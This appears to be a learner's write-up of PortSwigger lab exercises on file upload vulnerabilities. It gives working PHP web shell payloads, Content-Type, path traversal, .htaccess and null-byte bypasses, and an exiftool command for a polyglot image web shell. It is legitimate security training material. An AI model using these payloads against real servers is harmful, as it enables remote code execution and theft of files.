# Lab

## Tool: Burp Suite

### Exploiting unrestricted file uploads to deploy a web shell

#### Lab: Remote code execution via web shell upload

##### source: <https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload>

* To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file */home/carlos/secret*.

Solution:

After login, I use the upload function to upload a PHP script, whose name is *test.php*. The script is `**<?php echo file_get_contents('/home/carlos/secret'); ?>**`. After upload, I only receive the notice that *The file avatars/test.php has been uploaded.*. I wonder why I fail where no content of the script is returned. As I searched for the solution, I realized that after clicking *Back to My Account*, the upload file had just been completed. And the page will reload again with a new script supplied. The secret is *HLPFIz0HNr4MnAcSRrgNcibNv1q9zrWM*.

### Exploiting flawed validation of file uploads

#### Flawed file type validation

##### Lab: Web shell upload via Content-Type restriction bypass

###### source: <https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass>

* To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file */home/carlos/secret*.

Solution:

We use the same above payload. When we upload file with php extension the **Content-Type:** is *application/octet-stream*. We receive error as *Sorry, file type application/octet-stream is not allowed Only image/jpeg and image/png are allowed*. We only modified **Content-Type:** to *image/jpeg* or *image/png*. The secret is *JJg5wmH8bthzE58uKYLzg534HmlFTYhy*.

#### Preventing file execution in user-accessible directories

##### Lab: Web shell upload via path traversal

###### source: <https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal>

* To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file */home/carlos/secret*.

Solution:

> Web servers often use the *filename* field in *multipart/form-data* requests to determine the name and location where the file should be saved.

If we do the same as the previous lab. The result returned is that our payload is displayed as plain text. This lab uses technical upload files and path traversal. So, initially, I am so stuck because I cannot find where to do a traversal directory. After observing the solution and reading the content again. The *filename* field determines the name of the file. So when we sent *filename="test.php"*, we received *The file avatars/test.php has been uploaded.* File is uploaded to *avatars* folder. And when loading the image, the application gets a path as */files/avatars/test.php* to load the image. When one file is uploaded to *avatars* if it is a script, it will not execute as i said above. We need to upload files to another folder, except *avatars*. So we have payload as `**filename="..%2ftest.php"**`.

> We need to encode ../ because applications block requests that contain obvious signs of a directory traversal attack.

We receive notice that *The file avatars/../test.php has been uploaded.* This means that *test.php* is uploaded to the *file* folder. The interesting thing here is that the file name is *..%2ftest.php*, but when it is added to the path to determine the location where the file should be saved, it changes to *test.php* and is saved in the *file* folder. There is a new problem here in the step to load */files/avatars/../test.php*. We need to change *%2f* to */* because it doesn't have the ability to decode here. The secret is *2v06EqBEvern82rCTTJZLajo3MP0Gzl3*.

#### Insufficient blacklisting of dangerous file types

##### Lab: Web shell upload via extension blacklist bypass

###### souce: <https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass>

* To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file */home/carlos/secret*.

Solution:

> You need to upload two different files to solve this lab.

One more lab is hard. I have to observe the solution before doing it. I will collaborate with the solution provider to clearly explain my solution. From the hint, we know that two files are uploaded: one is a configuration file, and another is a file to exfiltrate the contents. The configuration file is *.htaccess*; we know this because in response it said *Server: Apache/2.4.41 (Ubuntu)*, so we use *.htaccess* of Apache. Initial, my configure file is ...

> LoadModule php_module /usr/lib/apache2/modules/libphp.so  
> AddType application/x-httpd-php .php5

It is still uploaded *The file avatars/.htaccess has been uploaded.* but when it is loaded, I receive an *Internal Server Error*, *The server encountered an internal error or misconfiguration and was unable to complete your request.* That means my configure file is misconfigured, so it isn't executed. After observing the solution, I removed *LoadModule php_module /usr/lib/apache2/modules/libphp.so*. When loading it, I receive *Forbidden*, *You don't have permission to access this resource.*.  The after-configure file is executed, and this resource is banned. Come here; we simply change *.php* to *.php5* and get *secret*. The secret is *iIhhALGH2Bhc39St8SL9HFXykxAT0nMG*.

#### Obfuscating file extensions

##### Lab: Web shell upload via obfuscated file extension

##### source: <https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension>

* To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file */home/carlos/secret*.

Solution:

When I post a *.php* file. It said *only JPG & PNG files are allowed*. So we only need to modify the file extension to this: `**filename="test.php%00.png"**`. After that, we have an issue where we cannot receive */files/avatars/test.php* normally. We have to borrow other responses with the right extension *png* or *jpg* and modify them to get *secret*. The secret is *9zP58SHF8CNTjsboOlcjj0NwP0jjCKaX*.

### Flawed validation of the file's contents

#### Lab: Remote code execution via polyglot web shell upload

##### source: <https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload>

* To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file */home/carlos/secret*.

Solution:

First, I think that we can insert a payload into an image normally by capturing the request sent by Burp Suit, but it fails. As I examine the solution, I realize that we cannot pass payloads to images normally. We need to use the tool *Exiftool*. We need to create a polyglot JPEG file containing malicious code within its metadata. The command to create an image is `**exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" test.jpg -o image.php**`. The output is *image.php*

> When I checked file type, it said *image.php: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: ```"<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>"```, progressive, precision 8, 2500x1250, components 3*.

It is still a *JPEG* file with a *.php* extension. When using Burp Suite to capture this request, we can see the payload is inserted into a fake image. After loading the image, we can get *secret*. The secret is *FLWcGYVRkJ37gc9wwRNMCsRqomXVRqi0*.

### Exploiting file upload race conditions

